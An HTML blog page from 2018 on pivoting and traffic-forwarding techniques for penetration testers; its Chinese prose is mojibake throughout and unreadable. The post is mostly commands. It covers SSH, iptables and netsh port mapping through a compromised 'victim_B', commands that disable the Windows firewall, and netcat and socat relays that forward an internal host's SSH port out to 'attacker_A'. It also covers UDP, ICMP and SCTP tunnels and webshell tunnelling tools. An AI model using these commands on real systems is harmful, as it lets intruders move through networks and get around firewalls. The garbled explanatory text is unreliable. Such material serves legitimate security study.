<!DOCTYPE html>
<html lang="zh"><meta charset="utf-8"><meta name="generator" content="Hugo 0.154.5"><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<meta name="color-scheme" content="light dark">
<meta name="supported-color-schemes" content="light dark"><meta name="description" content="æ€è·¯
æ¸—é€æµ‹è¯•ä¸­ï¼Œå¿…é¡»ä½¿ç”¨ä»£ç†æœåŠ¡å™¨ï¼Œæ‰€ä»¥é¦–å…ˆå‡è®¾æˆ‘ä»¬æœ‰ä¸€å°å…·æœ‰å…¬ç½‘IPçš„æœåŠ¡å™¨ï¼Œä½œä¸ºæ”»å‡»æœºã€‚"><title>æ¸—é€ä¸­çš„æ•°æ®è½¬å‘æŠ€å·§&nbsp;&ndash;&nbsp;Gorgias&#39; Blog</title><link rel="stylesheet" href="/css/core.min.363cdd0e3e6340dd0e88b1f21887fb7e53e3129ed31d7f3cf62686d06069621ece79dc5ffb48a77ebba54468e667212f.css" integrity="sha384-NjzdDj5jQN0OiLHyGIf7flPjEp7THX889iaG0GBpYh7Oedxf&#43;0infrulRGjmZyEv"><meta name="twitter:card" content="summary" />
<meta name="twitter:title" content="æ¸—é€ä¸­çš„æ•°æ®è½¬å‘æŠ€å·§" /><body><section id="header">
    <div class="header wrap"><span class="header left-side"><a class="site home" href="/zh/"><span class="site name">Gorgias' Blog</span></a></span>
        <span class="header right-side"><div class="nav wrap"><nav class="nav"><a class="nav item" href="/zh/categories/">åˆ†ç±»</a><a class="nav item" href="/zh/tags/">æ ‡ç­¾</a><a class="nav item" href="/zh/about/">å…³äº</a><a class="nav item" href="/zh/links/">å‹é“¾</a><a class="nav item" href="/en/posts/data-forwarding-techniques-in-pentest/" title="English">
            <span class="lang-icon">ğŸŒ</span>English</a></nav></div></span></div></section><section id="content"><style>
     
    .toc-wrapper {
        position: fixed;
        bottom: 30px;
        right: 30px;
        z-index: 9999;
        display: flex;
        flex-direction: column-reverse;
        align-items: flex-end;
        gap: 10px;
    }

     
    .toc-button {
        background-color: #fff;
        color: #333;
        width: 50px;
        height: 50px;
        border-radius: 50%;
        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
        display: flex;
        align-items: center;
        justify-content: center;
        cursor: pointer;
        border: 1px solid #ddd;
        transition: transform 0.2s, box-shadow 0.2s;
    }

    .toc-button:hover {
        transform: translateY(-2px);
        box-shadow: 0 6px 16px rgba(0, 0, 0, 0.2);
    }

    .toc-button svg {
        width: 24px;
        height: 24px;
        fill: currentColor;
    }

     
    .toc-content-box {
        background: #fff;
        border: 1px solid #eee;
        border-radius: 8px;
        padding: 15px;
        width: 250px;
        max-height: 60vh;
        overflow-y: auto;
        box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
        display: none;
         
        font-size: 0.9em;
        opacity: 0;
        transform: translateY(10px);
        transition: opacity 0.3s, transform 0.3s;
    }

    .toc-content-box.show {
        display: block;
        opacity: 1;
        transform: translateY(0);
    }

    .toc-header {
        font-weight: bold;
        border-bottom: 2px solid #f0f0f0;
        padding-bottom: 8px;
        margin-bottom: 8px;
        font-size: 1.1em;
    }

     
    #TableOfContents {
        text-align: left;
    }

    #TableOfContents ul,
    #TableOfContents ol {
        list-style: none;
        padding-left: 0;
        margin: 0;
    }

    #TableOfContents li {
        margin: 4px 0;
    }

    #TableOfContents ul ul,
    #TableOfContents ol ol {
        padding-left: 1em;
    }

    #TableOfContents a {
        text-decoration: none;
        color: #555;
        display: block;
        padding: 2px 0;
        transition: color 0.2s;
    }

    #TableOfContents a:hover {
        color: #007bff;
    }

     
    @media (prefers-color-scheme: dark) {
        .toc-button {
            background-color: #333;
            color: #ddd;
            border-color: #555;
        }

        .toc-content-box {
            background-color: #2a2a2a;
            border-color: #444;
            color: #ddd;
        }

        .toc-header {
            border-bottom-color: #444;
        }

        #TableOfContents a {
            color: #aaa;
        }

        #TableOfContents a:hover {
            color: #fff;
        }
    }
</style><div class="article-container"><section class="article header">
    <h1 class="article title">æ¸—é€ä¸­çš„æ•°æ®è½¬å‘æŠ€å·§</h1><p class="article date">2018-04-04<span class="langs"><span class="lang">
                    <a href="/en/posts/data-forwarding-techniques-in-pentest/" title="English">
                        <span class="lang-icon">ğŸŒ</span>English</a>
                </span></span></p></section><article class="article markdown-body"><h2 id="æ€è·¯">æ€è·¯</h2>
<p>æ¸—é€æµ‹è¯•ä¸­ï¼Œå¿…é¡»ä½¿ç”¨ä»£ç†æœåŠ¡å™¨ï¼Œæ‰€ä»¥é¦–å…ˆå‡è®¾æˆ‘ä»¬æœ‰ä¸€å°å…·æœ‰å…¬ç½‘IPçš„æœåŠ¡å™¨ï¼Œä½œä¸ºæ”»å‡»æœºã€‚</p>
<p>å†…ç½‘æ˜¯ç›¸å¯¹çš„ï¼Œæœ‰æ—¶è¿›å…¥DMZåŒºï¼Œå‘ç°è¦ä½¿ç”¨VPNè¿›å…¥ç›®æ ‡ç½‘æ®µã€‚åœ¨è¿™é‡Œè®¨è®ºåªä¸€å°å—å®³ä¸»æœºçš„æ”»å‡»è·¯å¾„ï¼Œè®¤ä¸ºæ˜¯æœ€å°å…ƒï¼Œéœ€è¦å¾—å‡ºä¸€ä¸ªæ–¹æ³•è®ºï¼Œè¿™ä¸ªæ–¹æ³•è®ºå°†é€‚ç”¨äºæ›´å¤šå°å—å®³ä¸»æœºçš„ç¯å¢ƒã€‚</p>
<p>å¦‚æœæ‹¿ä¸‹çš„å—å®³æœºåœ¨å…¬ç½‘å¼€æ”¾äº†ç«¯å£ï¼Œå¹¶ä¸”æ²¡æœ‰é˜²ç«å¢™ï¼Œå¯ä»¥éšæ„è®¿é—®å®ƒçš„ç«¯å£ï¼Œé‚£ä¹ˆç›´æ¥å¯ä»¥æŠŠå®ƒæŠ½è±¡æˆæ”»å‡»æœºã€‚</p>
<p>ä½†æ˜¯ï¼Œå¦‚æœæ‹¿ä¸‹çš„ä¸»æœºä¸æ˜¯å¼€æ”¾åœ¨å…¬ç½‘çš„ï¼Œæˆ–è€…è¯´ä¸Šçº§å…·æœ‰é˜²ç«å¢™æ„ä¹‰çš„è®¾å¤‡ï¼Œé‚£ä¹ˆè¿›è¡Œä¸‹é¢çš„æ­¥éª¤ã€‚</p>
<p>ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œéƒ½æ˜¯é€šè¿‡TCPæ–¹å¼è®¿é—®æœåŠ¡å™¨ã€‚</p>
<ul>
<li>ç«¯å£æ˜ å°„ï¼šé€šè¿‡æŠŠç›®æ ‡ç«¯å£æ˜ å°„åˆ°ç©ºé—²ç«¯å£æ‰“å…¥å†…ç½‘ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ç«¯å£å¤ç”¨ï¼ˆå¦‚iptablesï¼‰</li>
<li>æ­£å‘ä»£ç†ï¼šç›´æ¥åˆ©ç”¨è¿™ä¸ªç«¯å£ä½œä¸ºéš§é“æ‰“å…¥å†…ç½‘</li>
<li>åå‘ä»£ç†ï¼šå¦‚æœæ¡ä»¶ä¸å…è®¸ä»å¤–éƒ¨å…¥ç«™ï¼Œé‚£ä¹ˆå¯ä»¥ä½¿ç”¨å—å®³æœºåå‘é“¾æ¥æ”»å‡»æœåŠ¡å™¨</li>
</ul>
<p>å¦‚æœç›®æ ‡æœåŠ¡å™¨æ— æ³•ä½¿ç”¨TCPå‡ºç«™ï¼Œé‚£ä¹ˆå¯ä»¥ä½¿ç”¨UDPéš§é“ï¼Œè¿™é‡Œå°±ä¸å­˜åœ¨æ­£å‘åå‘çš„æ¦‚å¿µï¼Œè€Œæ˜¯å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯çš„æ¦‚å¿µäº†ã€‚
æœ‰æ—¶ä¼šé‡åˆ°è®¾æœ‰é˜²ç«å¢™çš„æœºå™¨ï¼Œå¦‚æœæ˜¯é»‘åå•ç­–ç•¥ï¼Œç›¸å¯¹å¥½æã€‚å¦‚æœæ˜¯ç™½åå•ç­–ç•¥ï¼Œä¸€èˆ¬ä¸ä¼šç¦ç”¨UDPï¼Œå¯èƒ½ä¼šå…è®¸å‡ºè®¿é—®å¤–éƒ¨53ç«¯å£ã€‚
å¦‚æœè¿å‡ºç«™çš„UDPéƒ½ç¦ç”¨çš„è¯ï¼Œé‚£ä¹ˆä½¿ç”¨ICMPéš§é“ï¼Œä½†åœ¨è¿™ç§åœºæ™¯ä¸‹ï¼Œææœ‰å¯èƒ½æ‹¦æˆªICMPåŒ…ã€‚</p>
<p>å¤§å¤šæƒ…å†µä¸‹å»ºç«‹éš§é“ä¸æ˜¯å¾ˆç¨³å®šï¼Œé€šå¸¸ä¼šå»ºç«‹éš§é“ä¹‹ååˆ©ç”¨å—å®³æœºçš„sshæœåŠ¡ï¼Œå¯ç”¨socks5ä»£ç†æ‰“å…¥å†…ç½‘(é…åˆSockså®¢æˆ·ç«¯ï¼Œproxychains-NGæˆ–proxifier)ã€‚</p>
<p>é¦–å…ˆå®šä¹‰Aä¸ºæ”»å‡»æœºï¼ŒBä¸ºå—å®³è·³æ¿æœºï¼ŒCä¸ºå…¶ä»–æœºå™¨ï¼Œä¹Ÿå¯ä»¥ä¸ºBæœ¬èº«ï¼Œåœ¨åç»­çš„ä»‹ç»ä¸­ä¹Ÿä¼šç”¨åˆ°è¿™äº›å®šä¹‰ã€‚
æ¥ä¸‹æ¥åˆ†æ¸…å‡ ä¸ªæ¦‚å¿µï¼Œåªè¦èƒ½å¤ŸåŒºåˆ†mappingï¼ˆæ˜ å°„ï¼‰å’Œtunningï¼ˆéš§é“ï¼‰å°±è¡Œã€‚ç”¨ä¸­æ–‡æ¥ç†è§£æ¯”è¾ƒéšæ™¦ï¼Œå…¶å®mappingå’Œtunningéƒ½å±äºè½¬å‘(forwarding)ï¼Œæ˜ å°„ä¹Ÿèƒ½ç§°ä½œæ­£å‘çš„è½¬å‘ï¼Œåå¼¹å¯ä»¥ç†è§£ä¸ºåå‘çš„è½¬å‘ã€‚</p>
<ul>
<li>æ˜ å°„ï¼šBç›‘å¬ç«¯å£ï¼ŒCç›‘å¬ç«¯å£ï¼ŒæŠŠæ¥è‡ªAçš„è¯·æ±‚ä¼ é€’ç»™Cï¼Œä¹Ÿå°±æ˜¯Cæ˜ å°„åˆ°äº†Bä¸Š</li>
<li>éš§é“ï¼šAç›‘å¬ç«¯å£ï¼ŒCç›‘å¬ç«¯å£ï¼ŒBä¸»åŠ¨æŠŠCçš„ç›‘å¬ç«¯å£è½¬å‘ç»™Aï¼Œè¿™æ ·ACç›´æ¥å°±ç›¸å½“äºä¸€æ¡éš§é“</li>
<li>åå¼¹ï¼šAç›‘å¬ç«¯å£ï¼ŒBç›‘å¬ç«¯å£ï¼Œå…ˆç”±æŸç§æ¡ä»¶è§¦å‘ä½¿Bä¸»åŠ¨é“¾æ¥A</li>
</ul>
<h2 id="ç›´æ¥è½¬å‘">ç›´æ¥è½¬å‘</h2>
<p>è¿™é‡ŒæŒ‡ç½‘ç»œå±‚ä¸ä¼ è¾“å±‚çš„æ•°æ®è½¬å‘</p>
<h3 id="ssh">SSH</h3>
<p>è¿™é‡Œåªé’ˆå¯¹SSH1ï¼Œé¦–å…ˆä»‹ç»å‡ ä¸ªå¯é€‰å‚æ•°</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">-C å¯ç”¨å‹ç¼©ï¼Œåœ¨ç½‘ç»œå·®çš„æƒ…å†µä¸‹ä½¿ç”¨ï¼Œä¹Ÿå¯ä»¥ç”¨æ¥æ‹–æ•°æ®
</span></span><span class="line"><span class="cl">-N ä¸æ‰§è¡Œä»»ä½•å‘½ä»¤ï¼Œåªåšç«¯å£è½¬å‘
</span></span><span class="line"><span class="cl">-g å…è®¸è¿œç¨‹ä¸»æœºè¿æ¥åˆ°æœ¬åœ°è½¬å‘ç«¯å£ï¼Œå¦‚æœè®¿é—®å—å®³æœºæœ¬åœ°ç«¯å£ï¼Œéœ€è¦æŒ‡å®šæ­¤å‚æ•°
</span></span><span class="line"><span class="cl">-q é™é»˜æ¨¡å¼
</span></span><span class="line"><span class="cl">-T ç¦ç”¨ä¼ªç»ˆç«¯ï¼Œä½¿ç”¨whoçœ‹ä¸åˆ°ä¼ªç»ˆç«¯ç”¨æˆ·<span class="o">(</span>ä½†æ˜¯è¿™é‡Œå¥½åƒä¸éœ€è¦<span class="o">)</span>
</span></span></code></pre></div><h4 id="è½¬å‘è¿œç¨‹ç«¯å£åˆ°æœ¬åœ°ç«¯å£">è½¬å‘è¿œç¨‹ç«¯å£åˆ°æœ¬åœ°ç«¯å£</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh -Ng -L local:13389:target_C:3389 root@victim_B
</span></span></code></pre></div><h4 id="è½¬å‘æœ¬åœ°ç«¯å£åˆ°è¿œç¨‹ç«¯å£">è½¬å‘æœ¬åœ°ç«¯å£åˆ°è¿œç¨‹ç«¯å£</h4>
<p>å¯èƒ½éœ€è¦åœ¨/etc/ssh/sshd_configè®¾ç½®
AllowAgentForwarding yes
AllowTcpForwarding yes
GatewayPorts yes</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh -N -R remote:3000:local:80 root@victim_B
</span></span></code></pre></div><h4 id="ä½¿ç”¨socks5ä»£ç†">ä½¿ç”¨Socks5ä»£ç†</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh -N -D 127.0.0.1:1080 root@victim_B
</span></span></code></pre></div><h3 id="iptablesç«¯å£æ˜ å°„">iptablesç«¯å£æ˜ å°„</h3>
<p>é¦–å…ˆå¼€å¯ç³»ç»Ÿå†…æ ¸çš„IPv4è½¬å‘</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="m">1</span> &gt; /proc/sys/net/ipv4/ip_forward
</span></span></code></pre></div><p>åˆ©ç”¨NATå¯¹ç«¯å£è¿›è¡Œè½¬å‘</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">iptables -t nat -A PREROUTING -d victim_B -p tcp --dport listen_port -j DNAT --to-destination target_C:target_port
</span></span><span class="line"><span class="cl">iptables -t nat -A POSTROUTING -d target_C -p tcp --dport target_port -j SNAT --to victim_B
</span></span></code></pre></div><h3 id="netshç«¯å£æ˜ å°„">netshç«¯å£æ˜ å°„</h3>
<p>ä½¿ç”¨ç³»ç»Ÿè‡ªå¸¦ç«¯å£æ˜ å°„</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">netsh interface portproxy add v4tov4 listenaddress=victim_B listenport=3388 connectaddress=target_C connectport=3389
</span></span></code></pre></div><p>åˆ é™¤è½¬å‘è§„åˆ™</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">netsh interface portproxy delete v4tov4 listenaddress=victim_B  listenport=3388
</span></span></code></pre></div><p>é˜²ç«å¢™å…è®¸ç›¸åº”å…¥ç«™è§„åˆ™</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">netsh advfirewall firewall add rule name=<span class="s2">&#34;forwarded_RDP_3388&#34;</span> protocol=TCP dir=in localip=victim_B localport=3388 action=allow
</span></span></code></pre></div><p>ä¹Ÿå¯ä»¥å…³é—­é˜²ç«å¢™</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># æ–°ç‰ˆ</span>
</span></span><span class="line"><span class="cl">netsh advfirewall <span class="nb">set</span> allprofiles state off
</span></span><span class="line"><span class="cl"><span class="c1"># æ—§ç‰ˆ</span>
</span></span><span class="line"><span class="cl">netsh firewall <span class="nb">set</span> opmode disable
</span></span><span class="line"><span class="cl"><span class="c1"># æˆ–</span>
</span></span><span class="line"><span class="cl">net stop mpssvc
</span></span></code></pre></div><p>æŸ¥çœ‹æ‰€æœ‰ä»£ç†</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">netsh interface portproxy show all
</span></span></code></pre></div><h3 id="netcat">netcat</h3>
<p>é¦–å…ˆåœ¨æµè¡Œçš„å‘è¡Œç‰ˆä¸­ï¼Œå¤§å¤šæ•°NetCatä¸æ”¯æŒç›‘å¬ç«¯å£å’Œç¨‹åºé‡å®šå‘ã€‚
NetCatæ˜¯éå¸¸å¼ºå¤§çš„ç½‘ç»œå·¥å…·ï¼Œæ”¯æŒæ‰«æï¼Œå„ç§æ•°æ®ä¼ è¾“ï¼ŒNcatæ˜¯æ”¹è¿›ç‰ˆæœ¬ï¼Œè¿™é‡Œåªä»‹ç»ç½‘ç»œå±‚é¢çš„è½¬å‘å’Œæ˜ å°„ã€‚
SoCatæ›´å¼ºå¤§ï¼Œæ”¯æŒæ›´å¤šç§è¾“å…¥è¾“å‡ºï¼Œæ”¯æŒè¿æ¥å¤ç”¨ã€‚</p>
<h4 id="ç«¯å£æ˜ å°„">ç«¯å£æ˜ å°„</h4>
<p>é¦–å…ˆåœ¨Bä¸»æœºåˆ›å»ºFIFOæ–‡ä»¶ï¼Œç„¶åæŠŠCä¸»æœºçš„SSHæœåŠ¡ç«¯å£æ˜ å°„åˆ°Bä¸»æœºçš„9000ç«¯å£</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mkfifo /tmp/fifo
</span></span><span class="line"><span class="cl">cat /tmp/fifo <span class="p">|</span> nc target_C <span class="m">22</span> <span class="p">|</span> nc -vlp <span class="m">9000</span> &gt; /tmp/fifo
</span></span><span class="line"><span class="cl"><span class="c1"># æˆ–è€…</span>
</span></span><span class="line"><span class="cl">cat /tmp/fifo <span class="p">|</span> nc -vlp <span class="m">9000</span> <span class="p">|</span> nc target_C <span class="m">22</span> &gt; /tmp/fifo
</span></span></code></pre></div><p>æˆ–è€…ä½¿ç”¨socatï¼Œè¿™æ ·åªèƒ½è¿æ¥ä¸€æ¬¡</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">socat tcp-connect:target_C:22 tcp-listen:9000
</span></span></code></pre></div><p>ä½¿ç”¨reuseaddr,reuseport,forkå‚æ•°ï¼Œå…è®¸å¤šæ¬¡é“¾æ¥</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">socat tcp-listen:9000,reuseaddr,reuseport,fork tcp-connect:target_C:22
</span></span></code></pre></div><p>åœ¨Aä¸»æœºç”¨SSHè¿æ¥Bä¸»æœºçš„9000ç«¯å£ï¼Œå°±èƒ½ä½¿ç”¨Cä¸»æœºçš„SSHæœåŠ¡ã€‚</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh root@victim_B -p <span class="m">9000</span>
</span></span></code></pre></div><h4 id="ç«¯å£è½¬å‘">ç«¯å£è½¬å‘</h4>
<p>é¦–å…ˆï¼Œåœ¨Aä¸»æœºåˆ›å»ºFIFOæ–‡ä»¶ï¼Œç„¶åç›‘å¬8888ç«¯å£æ¥æ”¶æ¥è‡ªBä¸»æœºçš„è½¬å‘æ•°æ®ï¼Œç›‘å¬9000ç«¯å£ä½œä¸ºè½¬å‘æœåŠ¡ç«¯å£ã€‚</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mkfifo /tmp/fifo
</span></span><span class="line"><span class="cl">cat /tmp/fifo <span class="p">|</span> nc -vlp <span class="m">8888</span> <span class="p">|</span> nc -vlp <span class="m">9000</span> &gt; /tmp/fifo
</span></span><span class="line"><span class="cl"><span class="c1"># æˆ–è€…</span>
</span></span><span class="line"><span class="cl">cat /tmp/fifo <span class="p">|</span> nc -vlp <span class="m">9000</span> <span class="p">|</span> nc -vlp <span class="m">8888</span> &gt; /tmp/fifo
</span></span></code></pre></div><p>æˆ–è€…ä½¿ç”¨socat</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">socat tcp-listen:8888,reuseaddr,reuseport,fork tcp-listen:9000,reuseaddr,reuseport,fork
</span></span></code></pre></div><p>å…¶æ¬¡ï¼Œåœ¨Bä¸»æœºåˆ›å»ºFIFOæ–‡ä»¶ï¼Œç„¶åæŠŠCä¸»æœºçš„SSHæœåŠ¡è½¬å‘ç»™æ”»å‡»æœºç›‘å¬çš„8888ç«¯å£ã€‚</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mkfifo /tmp/fifo
</span></span><span class="line"><span class="cl">cat /tmp/fifo <span class="p">|</span> nc target_C <span class="m">22</span> <span class="p">|</span> nc attacker_A <span class="m">8888</span> &gt; /tmp/fifo
</span></span><span class="line"><span class="cl"><span class="c1"># æˆ–è€…</span>
</span></span><span class="line"><span class="cl">cat /tmp/fifo <span class="p">|</span> nc attacker_A <span class="m">8888</span> <span class="p">|</span> nc target_C <span class="m">22</span> &gt; /tmp/fifo
</span></span></code></pre></div><p>æˆ–è€…ä½¿ç”¨socat</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">socat tcp-connect:target_C:22 tcp-connect:attacker_A:8888
</span></span></code></pre></div><p>æœ€åï¼Œä½¿ç”¨sshè¿æ¥Aä¸»æœºçš„9000ç«¯å£ï¼Œå³è¿æ¥åˆ°äº†Cä¸»æœºçš„22ç«¯å£</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh root@attacker_A -p <span class="m">9000</span>
</span></span></code></pre></div><h3 id="socat">socat</h3>
<p>SoCatè·ŸNetcatæ“ä½œç±»ä¼¼ï¼Œä½†æ˜¯æ›´åŠ å¼ºå¤§ã€‚æ”¯æŒå¤šé‡ä¸åŒå±‚æ¬¡çš„åè®®ã€‚</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">TCP4    TCP IPv4
</span></span><span class="line"><span class="cl">TCP6    TCP IPv6
</span></span><span class="line"><span class="cl">UDP     UDPåè®®
</span></span><span class="line"><span class="cl">UNIX    UNIXæœ¬åœ°å¥—æ¥å­—
</span></span><span class="line"><span class="cl">SCTP4   SCTP IPv4
</span></span><span class="line"><span class="cl">SCTP6   SCTP IPv6
</span></span><span class="line"><span class="cl">OPENSSL å®‰å…¨å¥—æ¥å±‚
</span></span><span class="line"><span class="cl">SOCKET  å¥—æ¥å­—
</span></span></code></pre></div><h4 id="æ˜ å°„æ“ä½œ">æ˜ å°„æ“ä½œ</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">socat tcp-connect:target_C:22 tcp-listen:9000
</span></span></code></pre></div><p>ä½¿ç”¨reuseaddr,reuseport,forkå‚æ•°ï¼Œå…è®¸å¤šæ¬¡é“¾æ¥</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">socat tcp-listen:9000,reuseaddr,reuseport,fork tcp-connect:target_C:22
</span></span></code></pre></div><h4 id="è½¬å‘æ“ä½œ">è½¬å‘æ“ä½œ</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># victim_B</span>
</span></span><span class="line"><span class="cl">socat tcp-listen:8888,reuseaddr,reuseport,fork tcp-listen:9000,reuseaddr,reuseport,fork
</span></span><span class="line"><span class="cl"><span class="c1"># attacker_A</span>
</span></span><span class="line"><span class="cl">socat tcp-connect:target_C:22 tcp-connect:attacker_A:8888
</span></span></code></pre></div><h3 id="udpéš§é“">UDPéš§é“</h3>
<p>åœ¨Linuxä¸‹ï¼Œå¯ä»¥ä½¿ç”¨SoCatï¼Œä½†æ˜¯åœ¨Windowsä¸‹å°±ä¸è¡Œäº†</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">socat UDP-LISTEN:8888 tcp-connect:target_C:22
</span></span></code></pre></div><p>NetCatåªè¦åŠ ä¸ª-uå°±è¡Œ</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat /tmp/fifo <span class="p">|</span> nc -vulp <span class="m">9000</span> <span class="p">|</span> nc 192.168.1.127 <span class="m">22</span> &gt; /tmp/fifo
</span></span></code></pre></div><h4 id="rtcp2udp">rtcp2udp</h4>
<p><a href="https://github.com/ring04h/rtcp2udp"target="_blank" rel="noopener noreferrer">https://github.com/ring04h/rtcp2udp</a></p>
<h4 id="udptunnel">udptunnel</h4>
<p><a href="https://code.google.com/p/udptunnel/"target="_blank" rel="noopener noreferrer">https://code.google.com/p/udptunnel/</a></p>
<h3 id="icmpéš§é“">ICMPéš§é“</h3>
<p>é¦–å…ˆç¡®ä¿è¿™é‡Œä¸º0</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/proc/sys/net/ipv4/icmp_echo_ignore_all
</span></span></code></pre></div><h4 id="icmptunnel">icmptunnel</h4>
<p><a href="https://github.com/jamesbarlow/icmptunnel.git"target="_blank" rel="noopener noreferrer">https://github.com/jamesbarlow/icmptunnel.git</a></p>
<h4 id="ptunnel">ptunnel</h4>
<p>Linuxå¹³å°</p>
<p><a href="https://pkgs.org/download/ptunnel"target="_blank" rel="noopener noreferrer">https://pkgs.org/download/ptunnel</a></p>
<p>Windowså¹³å°</p>
<p><a href="https://github.com/ptunnel-win"target="_blank" rel="noopener noreferrer">https://github.com/ptunnel-win</a></p>
<h3 id="sctpéš§é“">SCTPéš§é“</h3>
<p>SCTPå±äºä¼ è¾“å±‚åè®®ï¼Œä¸åœ¨é˜²ç«å¢™TCPã€UDPç­–ç•¥çš„èŒƒå›´å†…ï¼ŒNcatæ”¯æŒï¼Œè¿™é‡Œä½¿ç”¨SoCatï¼Œè·Ÿç«¯å£æ˜ å°„ç±»ä¼¼ï¼ŒSCTPç›‘å¬8888ç«¯å£</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">socat SCTP-LISTEN:8888 tcp-connect:target_C:22
</span></span></code></pre></div><h4 id="dccpéš§é“">DCCPéš§é“</h4>
<p>å¤§å¤šæ•°Linuxä¸æ”¯æŒ</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">socat TCP4-LISTEN:8886,reuseaddr,type<span class="o">=</span>6,prototype<span class="o">=</span><span class="m">33</span> TCP-CONNECT:target_C:22
</span></span><span class="line"><span class="cl">socat TCP4-CONNECT:8886,reuseaddr,type<span class="o">=</span>6,prototype<span class="o">=</span><span class="m">33</span> TCP-LISTEN:9000
</span></span></code></pre></div><h3 id="nginxè½¬å‘">Nginxè½¬å‘</h3>
<p>é¦–å…ˆè¦ç¡®ä¿Nginxä½¿ç”¨äº†streamæ¨¡å—</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># ç»“æœè¿”å› --with-stream</span>
</span></span><span class="line"><span class="cl">nginx -V <span class="p">|</span> grep stream
</span></span></code></pre></div><p>åœ¨nginx.confåŠ å…¥ä¸‹é¢è¿™æ®µ</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">stream {
</span></span><span class="line"><span class="cl">    server {
</span></span><span class="line"><span class="cl">    listen 88;
</span></span><span class="line"><span class="cl">    proxy_connect_timeout 3s;
</span></span><span class="line"><span class="cl">    proxy_timeout 10s;
</span></span><span class="line"><span class="cl">    proxy_pass 127.0.0.1:22;
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">}
</span></span></code></pre></div><p>ä½¿nginxé‡è½½é…ç½®</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nginx -s reload
</span></span></code></pre></div><h3 id="å…¶ä»–å·¥å…·">å…¶ä»–å·¥å…·</h3>
<p><a href="https://github.com/vzex/dog-tunnel"target="_blank" rel="noopener noreferrer">dog-tunnel</a> - ä¸€ä¸ªä»£ç†å·¥å…·ï¼Œä¸»è¦æ˜¯æ‰“æ´ï¼ŒåŒäº‹æ¨è
<a href="http://rootkiter.com/EarthWorm/"target="_blank" rel="noopener noreferrer">EarthWorm</a> - è™«æ´ï¼Œå…¨å¹³å°ï¼Œå¥½è¯„è¾ƒå¤šï¼Œç”¨èµ·æ¥è€æ˜¯æ–­å¼€ï¼Œä¸ç¨³å®š
<a href="http://rootkiter.com/Termite/"target="_blank" rel="noopener noreferrer">Termite</a> - è™«æ´çš„ä¸‹ä¸€ä»£èšç¾¤ï¼Œå…¨å¹³å°ï¼Œæƒ³æ³•å¾ˆå¥½ï¼Œç”¨èµ·æ¥è€æ˜¯å´©æºƒï¼Œä½“éªŒä¸æ€ä¹ˆå¥½
JSPspy,ASPXspy,PHPspy - æ— ä¸‹è½½åœ°å€ï¼Œè¿™äº›WebShellå¸¦æœ‰tunnelå’Œportmapçš„åŠŸèƒ½
